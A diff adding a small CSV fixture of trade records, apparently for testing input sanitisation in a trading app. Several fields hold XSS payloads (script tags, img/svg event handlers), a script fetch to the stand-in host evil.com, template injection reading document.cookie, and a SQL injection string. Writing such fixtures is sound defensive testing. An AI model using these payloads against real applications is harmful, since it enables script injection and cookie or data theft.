@@ -1,0 +1,4 @@
+symbol,side,entryPrice,exitPrice,quantity,entryDate,exitDate,notes
+<script>alert('XSS')</script>,long,100,110,100,2024-01-01,2024-01-02,<img src=x onerror=alert(1)>
+AAPL,<svg onload=alert(2)>,<img src=x>,120,<script>fetch('http://evil.com')</script>,2024-01-01,2024-01-02,Normal trade
+${7*7},${alert()},${document.cookie},'OR'1'='1,999999999999999999999,2024-01-01,2024-01-02,Injection attempts
